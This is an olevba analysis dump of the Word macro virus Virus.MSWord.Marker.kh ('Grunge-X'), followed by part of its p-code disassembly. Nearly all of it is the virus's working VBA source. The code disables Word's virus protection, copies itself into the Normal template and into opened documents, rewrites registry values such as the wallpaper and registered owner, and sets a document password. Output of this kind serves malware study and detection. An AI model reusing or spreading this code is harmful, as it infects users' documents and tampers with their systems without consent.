olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kh - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Const Grunge = "< #  {Grunge-X Version 7010733465} I Hate EveryBody If EveryBody Not Like Me ! # >"

Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim Breed As Object
Dim Polly, AName As String
Dim DS, NTS, Di, NTI As Boolean
Dim XJhie, Users, LogData, LogFile As String
Dim FileNumber
On Error Resume Next
AName = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day")
    
FileNumber = FreeFile
         Open Application.Templates.Application.Path & "\Engine.dll" & MyIndex For Output As #FileNumber
            Print #FileNumber, "'This Is Quick Load in your Documents"
            Print #FileNumber, "'====================================="
            Print #FileNumber, "Sub ToolsMacro()"
            Print #FileNumber, "With Assistant.NewBalloon"
            Print #FileNumber, ".Button = msoButtonSetOK"
            Print #FileNumber, ".Heading = " & Chr(34) & "GRUNGE Is Block Your System" & Chr(34)
            Print #FileNumber, ".Text = " & Chr(34) & "System Is Disabled By (Grunge)" & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "You Can't Open VBMacro Code" & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "On this time, because the System is Busy." & Chr(34) & "& Chr(13) & _"
            Print #FileNumber, Chr(34) & "please check on your administrator system." & Chr(34)
            Print #FileNumber, ".Show"
            Print #FileNumber, "End With"
            Print #FileNumber, "SendKeys " & Chr(34) & "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that." & Chr(34) & ", True"
            Print #FileNumber, "Application.ActiveDocument.Password=" & Chr(34) & "GRUNGE" & Chr(34)
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub ViewVbCode()"
            Print #FileNumber, "ToolsMacro"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub ToolsOptions()"
            Print #FileNumber, "Options.SaveNormalPrompt = True"
            Print #FileNumber, "Options.SavePropertiesPrompt = True"
            Print #FileNumber, "Options.VirusProtection = True"
            Print #FileNumber, "ToolsMacro 'Dialogs(wdDialogToolsOptions).Show"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub FileOpen()"
            Print #FileNumber, "On Error Resume Next"
            Print #FileNumber, "Application.Caption = " & Chr(34) & "Include Grunge-X, please wait... " & Chr(34)
            Print #FileNumber, "ActiveWindow.Caption = ActiveDocument.Name"
            Print #FileNumber, "If Dialogs(wdDialogFileOpen).Show <> 0 Then"
            Print #FileNumber, "ActiveDocument.Save"
            Print #FileNumber, "End If"
            Print #FileNumber, "Application.Caption = " & Chr(34) & "Keep to Smile" & Chr(34)
            Print #FileNumber, "WordBasic.DisableAutoMacros False"
            Print #FileNumber, "Application.RecentFiles.Maximum = 0"
            Print #FileNumber, "End Sub"
            Print #FileNumber, "Sub AutoExit()"
            Print #FileNumber, "If (WeekDay(Date) = vbMonday)or (WeekDay(Date) = vbFriday) Then"
            Print #FileNumber, "Msgbox" & Chr(34) & "The Sun Is Gone But I Have I Light  (1967-1994)" & Chr(34) & ",48," & Chr(34) & "By Grunge-X" & Chr(34)
            Print #FileNumber, "Application.Quit"
            Print #FileNumber, "Else"
            Print #FileNumber, "Application.Quit"
            Print #FileNumber, "End IF"
            Print #FileNumber, "End Sub"
        Close #FileNumber
        Set NameModule = Application.NormalTemplate.VBProject.VBComponents.Import(Application.Templates.Application.Path & "\Engine.dll")
        NameModule.Name = "Grunge_Still_A_Live"
        For Each ObDel In NormalTemplate.VBProject.VBComponents
        If (ObDel.Name <> "ThisDocument") And (ObDel.Name <> "Grunge_Still_A_Live") Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
                Name:=ObDel.Name, Object:=wdOrganizerObjectProjectItems
            NormalTemplate.Save
        End If
    Next ObDel
On Error Resume Next
AddIns.Unload True
GoSub ShowMe
Options.VirusProtection = False
Application.UserName = "Grunge-X Include in"
Application.UserInitials = "Grunge-X"
Application.UserAddress = "Grunge-X@usa.net"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Di = AD.CodeModule.Find(Grunge, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Grunge, 1, 1, 10000, 10000)
If (Di Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If Di Then
   NTS = NormalTemplate.Saved
   XJhie = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For I = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, I, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, I, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, I, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   XJhie = XJhie & Chr(13) & _
         "'The Sun Is Gone But I have I Light" & Chr(13) & _
         "'================================================" & Chr(13) & _
         "'Date Infected : " & Format(Time, "hh:mm:ss AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "'User Infected : " & Application.UserName & Chr(13) & _
         "'Mail to       : " & Users & Chr(13) & Chr(13) & " "
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day") = 1
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString XJhie
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    XJhie = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
       '=======
   Set NameModule = Application.ActiveDocument.VBProject.VBComponents.Import(Application.Templates.Application.Path & "\Engine.dll")
        NameModule.Name = "Grunge_Still_A_Live"
   For Each ObDel In ActiveDocument.VBProject.VBComponents
        If (ObDel.Name <> "ThisDocument") And (ObDel.Name <> "Grunge_Still_A_Live") Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
                Name:=ObDel.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next ObDel
    f1 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
    MkDir f1 & "\OSGrunge"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Grunge Include Day") = AName + 1
    Open f1 & "\OSGrunge\Grunge" & AName & ".ini" & MyIndex For Output As #FileNumber
        Print #FileNumber, " "
        Print #FileNumber, " "
        Print #FileNumber, "Date Infected : " & Format(Time, "hh:mm:ss AMPM") & " - " & Format(Date, "dddd  dd-mmmm-yyyy")
        Print #FileNumber, "User Infected : " & Application.UserName
        Print #FileNumber, "Mail to       : " & Application.UserAddress
        Print #FileNumber, "Number Inf    : " & AName
    Close #FileNumber
    AD.CodeModule.AddFromString XJhie
     If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim FileSys As String
On Error Resume Next
 FileSys = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open FileSys & "\Grunge-X.Htm" For Output As #1
        Print #1, "<html>"
        Print #1, "<head>"
        Print #1, "<title>I Hate EveryBody If EveryBody Not Like Me</title>"
        Print #1, "<meta name='Author' content='Include By Jhie-X'>"
        Print #1, "<body text='#FFFFFF' bgcolor='077d41' link='#FFFFFF' vlink='#FFFFFF' alink='#FFFFFF'>"
        Print #1, "<center><p align='center'><font color='#800000'size='6'>The Sun Is Gone But I Have I Light<strong></strong></font></p>"
        Print #1, "<p align='center'><font color='#000000' size='5'><strong><a href='mailto:WWW.Grunge@Usa.Net.com'>WWW.Grunge@Usa.Net</a></strong></font> </p>"
        Print #1, "<InTemp><font face='Arial,Helvetica'><font size=+2><b>Hey Guys How Are You Today</b></font>"
        Print #1, "<p><table BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH='600' >"
        Print #1, "<tr>"
        Print #1, "<InTemp><center><img SRC='C:\Logo.sys' height=380 width=750 border=3></center>"
        Print #1, "</InTemp>"
        Print #1, "</tr>"
        Print #1, "</table>"
        Print #1, "<tr><InTemp><font face='arial, helvetica' size=-2><center>"
        Print #1, "<p><font face='Arial,Helvetica'><font size=-2>Copyright Jhie-X. All rights reserved"
        Print #1, "<br>Logo and website content are trademarks of Grunge Cooperation"
        Print #1, "</font></font></center>"
        Print #1, "</InTemp></tr></table>"
        Print #1, "</html>"
        Close #1
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Contrl Panel\Desktop", "Wallpaper") = FileSys & "\Grunge-X.Htm"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "    * Grunge Still A Live *"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "* Ujung Berung Bandung *"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "Grunge-X Created by X-Jhie"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Grunge-X Version 7010733465"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName") = "Grunge-X Include on Your SoftWare"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany") = "Copyright By Grunge-X (I Hate EveryBody If EveryBody Not Like Me"""
Return
Finish:
End Sub

'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:43:39 PM-Sunday, 23 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 





'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 11:08:56 BHO-I-Wednesday, 26 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:19:23 ABENK-Sunday, 30 Jul 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:25:31 -Kamis, 10 Agust 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 11:59:37 AM-Tuesday, 31 Oct 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:46:23 PM-Tuesday, 7 Nov 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 12:41:29 PM-Tuesday, 19 Dec 2000
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 03:06:28 PM-Monday, 5 Mar 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 09:14:42 PM-Monday, 27 Aug 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:50:28 AM-Saturday, 6 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:26:26 PM-Friday, 12 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:33:13 PM-Friday, 26 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 03:52:20 PM-Tuesday, 30 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 07:02:07 PM-Wednesday, 31 Oct 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 05:08:59 PM-Saturday, 17 Nov 2001
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 04:57:22 PM-Tuesday, 8 Jan 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 02:18:44 PM-Wednesday, 30 Jan 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 01:51:16 -ńđĺäŕ, 13 ôĺâ 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 


'The Sun Is Gone But I have I Light
'================================================
'Date Infected : 10:25:20 dop.-pondělí, 4 III 2002
'User Infected : Grunge-X Include in
'Mail to       : Grunge-X@usa.net

 

-------------------------------------------------------------------------------
VBA MACRO Grunge_Still_A_Live.bas 
in file: Virus.MSWord.Marker.kh - OLE stream: 'Macros/VBA/Grunge_Still_A_Live'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'This Is Quick Load in your Documents
'=====================================
Sub ToolsMacro()
With Assistant.NewBalloon
.Button = msoButtonSetOK
.Heading = "GRUNGE Is Block Your System"
.Text = "System Is Disabled By (Grunge)" & Chr(13) & _
"You Can't Open VBMacro Code" & Chr(13) & _
"On this time, because the System is Busy." & Chr(13) & _
"please check on your administrator system."
.Show
End With
SendKeys "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that.", True
Application.ActiveDocument.Password = "GRUNGE"
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub ToolsOptions()
Options.SaveNormalPrompt = True
Options.SavePropertiesPrompt = True
Options.VirusProtection = True
ToolsMacro 'Dialogs(wdDialogToolsOptions).Show
End Sub
Sub FileOpen()
On Error Resume Next
Application.Caption = "Include Grunge-X, please wait... "
ActiveWindow.Caption = ActiveDocument.Name
If Dialogs(wdDialogFileOpen).Show <> 0 Then
ActiveDocument.Save
End If
Application.Caption = "Keep to Smile"
WordBasic.DisableAutoMacros False
Application.RecentFiles.Maximum = 0
End Sub
Sub AutoExit()
If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbFriday) Then
Msgbox "The Sun Is Gone But I Have I Light  (1967-1994)", 48, "By Grunge-X"
Application.Quit
Else
Application.Quit
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.kh
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 28920 bytes
' Line #0:
' Line #1:
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x0052 "< #  {Grunge-X Version 7010733465} I Hate EveryBody If EveryBody Not Like Me ! # >"
' 	VarDefn Grunge
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	ArgsCall Document_Close 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	Dim 
' 	VarDefn Breed (As Object)
' Line #9:
' 	Dim 
' 	VarDefn Polly
' 	VarDefn AName (As String)
' Line #10:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn Di
' 	VarDefn NTI (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn XJhie
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	Dim 
' 	VarDefn FileNumber
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0012 "Grunge Include Day"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St AName 
' Line #15:
' Line #16:
' 	Ld Friend 
' 	St FileNumber 
' Line #17:
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x000B "\Engine.dll"
' 	Concat 
' 	Ld MyIndex 
' 	Concat 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #18:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "'This Is Quick Load in your Documents"
' 	PrintItemNL 
' Line #19:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "'====================================="
' 	PrintItemNL 
' Line #20:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	PrintItemNL 
' Line #21:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "With Assistant.NewBalloon"
' 	PrintItemNL 
' Line #22:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 ".Button = msoButtonSetOK"
' 	PrintItemNL 
' Line #23:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B ".Heading = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B "GRUNGE Is Block Your System"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #24:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 ".Text = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001E "System Is Disabled By (Grunge)"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "& Chr(13) & _"
' 	Concat 
' 	PrintItemNL 
' Line #25:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x001B "You Can't Open VBMacro Code"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "& Chr(13) & _"
' 	Concat 
' 	PrintItemNL 
' Line #26:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0029 "On this time, because the System is Busy."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "& Chr(13) & _"
' 	Concat 
' 	PrintItemNL 
' Line #27:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x002A "please check on your administrator system."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #28:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 ".Show"
' 	PrintItemNL 
' Line #29:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "End With"
' 	PrintItemNL 
' Line #30:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "SendKeys "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x00F0 "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 ", True"
' 	Concat 
' 	PrintItemNL 
' Line #31:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Application.ActiveDocument.Password="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "GRUNGE"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #32:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #33:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ViewVbCode()"
' 	PrintItemNL 
' Line #34:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ToolsMacro"
' 	PrintItemNL 
' Line #35:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #36:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	PrintItemNL 
' Line #37:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.SaveNormalPrompt = True"
' 	PrintItemNL 
' Line #38:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "Options.SavePropertiesPrompt = True"
' 	PrintItemNL 
' Line #39:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Options.VirusProtection = True"
' 	PrintItemNL 
' Line #40:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "ToolsMacro 'Dialogs(wdDialogToolsOptions).Show"
' 	PrintItemNL 
' Line #41:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #42:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileOpen()"
' 	PrintItemNL 
' Line #43:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #44:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Application.Caption = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "Include Grunge-X, please wait... "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #45:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "ActiveWindow.Caption = ActiveDocument.Name"
' 	PrintItemNL 
' Line #46:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "If Dialogs(wdDialogFileOpen).Show <> 0 Then"
' 	PrintItemNL 
' Line #47:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #48:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #49:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Application.Caption = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "Keep to Smile"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #50:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "WordBasic.DisableAutoMacros False"
' 	PrintItemNL 
' Line #51:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "Application.RecentFiles.Maximum = 0"
' 	PrintItemNL 
' Line #52:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #53:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub AutoExit()"
' 	PrintItemNL 
' Line #54:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "If (WeekDay(Date) = vbMonday)or (WeekDay(Date) = vbFriday) Then"
' 	PrintItemNL 
' Line #55:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Msgbox"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002F "The Sun Is Gone But I Have I Light  (1967-1994)"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ",48,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "By Grunge-X"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #56:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Application.Quit"
' 	PrintItemNL 
' Line #57:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Else"
' 	PrintItemNL 
' Line #58:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Application.Quit"
' 	PrintItemNL 
' Line #59:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End IF"
' 	PrintItemNL 
' Line #60:
' 	Ld FileNumber 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #61:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #62:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x000B "\Engine.dll"
' 	Concat 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	Set NameModule 
' Line #63:
' 	LitStr 0x0013 "Grunge_Still_A_Live"
' 	Ld NameModule 
' 	MemSt New 
' Line #64:
' 	StartForVariable 
' 	Ld ObDel 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #65:
' 	Ld ObDel 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld ObDel 
' 	MemLd New 
' 	LitStr 0x0013 "Grunge_Still_A_Live"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #66:
' 	LineCont 0x0004 09 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ObDel 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #67:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld ObDel 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #72:
' 	GoSub ShowMe 
' Line #73:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #74:
' 	LitStr 0x0013 "Grunge-X Include in"
' 	Ld Application 
' 	MemSt UserName 
' Line #75:
' 	LitStr 0x0008 "Grunge-X"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #76:
' 	LitStr 0x0010 "Grunge-X@usa.net"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #77:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #78:
